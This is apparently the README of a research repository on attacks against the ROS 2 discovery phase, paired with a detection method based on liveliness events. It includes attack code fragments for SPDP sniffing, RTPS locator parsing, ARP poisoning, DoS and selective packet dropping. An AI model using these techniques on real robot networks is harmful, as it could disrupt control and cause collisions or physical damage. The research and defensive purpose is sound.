# Cross-Layer Attacks from ROS 2 Discovery phase
<p align="center">
  <img alt="ROS2 logo" src="https://img.shields.io/badge/ROS--2-Humble-blue?style=for-the-badge">
  <img alt="Fast DDS logo" src="https://img.shields.io/badge/Fast--DDS-2.6.9-brightgreen?style=for-the-badge">
  <img alt="Scapy" src="https://img.shields.io/badge/Scapy-Packet%20Crafting-orange?style=for-the-badge">
</p>

## Paper Summary
ROS 2 protects communication data through SROS 2, but the unauthenticated discovery phase remains a security blind spot.
During the discovery phase, metadata such as IP addresses, ports, and participant identifiers are exposed and can be leveraged for ARP-based snooping, spoofing, and cross-layer attacks.

We design and implement cross-layer attack chains that manipulate lower network layers by leveraging these discovery-phase weaknesses.  
In real autonomous robot scenarios, we demonstrate that:

- **DoS attacks**: Even a short DoS lasting ~18 seconds can cause localization failure and induce a *kidnapped-robot* state.  
- **Selective forwarding attacks**: Dropping specific control packets can covertly block robot commands, leading to unsafe actuation, collisions, and potential physical damage.  

To counter these threats, we propose a detection mechanism that leverages QoS events, specifically ROS 2 liveliness events, to raise alerts during abnormal conditions and enable timely countermeasures.

Experiments were conducted on ROS 2 Humble with Fast DDS 2.6.9 over IEEE 802.11ac wireless links.
The attack code is released here to highlight how easily such vulnerabilities can be reproduced in practice, even against real robot systems.

# 💡 How the Cross-Layer Attack Chain Works
## Step 1. Multicast Join & SPDP Reception
The script consists of three logical stages: (1) joining the DDS discovery multicast, (2) capturing discovery packets, and (3) parsing RTPS to extract unicast locators.
### 1. Joining the Multicast Group
> - Create a UDP socket and call IP_ADD_MEMBERSHIP to join the standard ROS 2 discovery multicast group so that SPDP announcements reach the host.
> ```python
> mreq = struct.pack("4s4s", socket.inet_aton(MCAST_GRP), socket.inet_aton(LISTEN_IP))
> sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
> ```

### 2. Packet Sniffing with Scapy
> - Use the Scapy tool to sniff and capture SPDP traffic with a BPF filter, processing each packet.
> ```python
> sniff(
>     filter=f"udp and host {MCAST_GRP} and port {SPDP_PORT}",
>     prn=packet_handler,
>     store=False
> )
> ```
### 3. Unicast Locator Extraction (RTPS Parsing)
> - Scan RTPS submessages, find DATA (ID 0x15), then parse the SerializedPayload → ParameterList to extract Unicast Locator parameters.
> ```python
> # Find DATA Submessage (ID: 0x15)
> if submessage_id == 0x15:
>     # Loop through ParameterList
>     while param_offset < param_list_end:
>         # Find Unicast Locator PID
>         if pid in [PID_METATRAFFIC_UNICAST_LOCATOR, PID_DEFAULT_UNICAST_LOCATOR]:
>             # Decode Locator data (kind, port, address)
>             ...
>             return f"UDPv4:{ip_addr}:{port}"
> ```


## Step 2. Cross-Layer Attack Execution (MITM / DoS / Selective Forwarding)
> **Purpose.**
> 
>This section documents a controlled feasibility demonstration conducted in a closed testbed to evaluate detection and resilience of ROS 2/DDS-RTPS systems. The procedures are intended solely for defensive research under proper authorization.
### 1. ARP Poisoning
> - Alters the ARP cache tables of the target nodes, rerouting their traffic through the attacker and thereby establishing an man-in-the-middle (MITM) position between the endpoints.
> ```python
> # Poison the target's ARP table
> arp = ARP(op=2, pdst=victim_ip, psrc=source_ip, hwdst=victim_mac)
> sendp(Ether(dst=victim_mac)/arp, iface=iface, verbose=False)
> ```

### 2. Traffic Hijacking
> **Denial-of-Service (Drop-All topic)**
> - Disables forwarding at the interposed test node so that intercepted traffic is not relayed, effectively severing connectivity between peers.
> ```python
> # Disable IP forwarding on the attacker's machine
> if sysname == "Linux":
>     subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward=0"], check=True)
> ```

> **Selective Forwarding Attack (Topic-Aware)**
> - Inspects RTPS headers to identify Writer Entity IDs associated with designated application streams and conditionally drops those packets while forwarding others, making the disruption harder to detect.
> ```python
> def nfqueue_callback(packet, state):
>     """NetfilterQueue callback for selective packet dropping"""
>     pkt = IP(packet.get_payload())
>     ...
>             # Check for target Writer Entity ID
>             for submsg in rtps_data.get('submessages', []):
>                 writer_entity_id = submsg.get('writer_entity_id', 'N/A')
>                 if writer_entity_id and state.should_drop_entity_id(writer_entity_id):
>                     print(f"[DROP] Blocking packet with Writer Entity ID: {writer_entity_id}")
>                     packet.drop()  # Drop specific packets
>                     return
>             
>     packet.accept()  # Forward all other packets
> ```

---
## 🔎 The Detection: QoS Triggered Anomaly Detection.
### 📜 Overview
This configuration underpins the node’s diagnostic capability. When a liveliness event is triggered (i.e., the liveliness lease is not renewed within lease_duration), the node launches an automated investigation rather than treating it as a mere disconnection. 

Immediately after the event, the node inspects the ARP table to distinguish causes:

- **No table change** → likely a benign network condition (temporary latency, loss, roaming).

- **Table change** → potential attack (e.g., IP→MAC remap of a publisher/gateway, or a single MAC mapped to multiple IPs).

This two-step process differentiates transient delay from deliberate manipulation.

### 1. QoS Event Callback Configuration
> - Liveliness callback fires when the publisher’s liveliness lease expires (NOT_ALIVE).
> ``` cpp
> auto qos = rclcpp::QoS(rclcpp::KeepAll()).reliable();
> qos.liveliness(RMW_QOS_POLICY_LIVELINESS_AUTOMATIC);
> qos.liveliness_lease_duration(std::chrono::seconds(2)); 
> // Bind the liveliness_callback function to the event
> rclcpp::SubscriptionOptions options;
> options.event_callbacks.liveliness_callback =
> std::bind(&MinimalSubscriber::liveliness_callback, this, _1);
> ```
>
### 2. Event-Driven Diagnostics (ARP Verification)
> **Update ARP Cache**: The node executes the system command arp -n to fetch the current IP-to-MAC address mappings on the network.
>
> **Verify Changes & Detect Conflicts**: It compares the newly fetched ARP table against its previously stored version.
> Critically, it checks if a single MAC address is mapped to multiple IP addresses.
> ``` cpp
> // C++ code snippet for the liveliness callback
> void MinimalSubscriber::liveliness_callback(rclcpp::QOSLivelinessChangedInfo &event)
> {
> // If a publisher is declared "not alive"...
>   if (event.not_alive_count > 0) {
>       // ...update the local ARP cache...
>       update_arp_cache();
>       // ...and verify it for changes and conflicts.
>       verify_arp_changes();
>     }
> }
> ```
✅ Platform note: Implemented and tested on Linux; root privileges may be required to access detailed arp cache table info.

## 📢 Notice
This project is currently compatible with ROS 2 Humble using Fast DDS 2.6.9. 
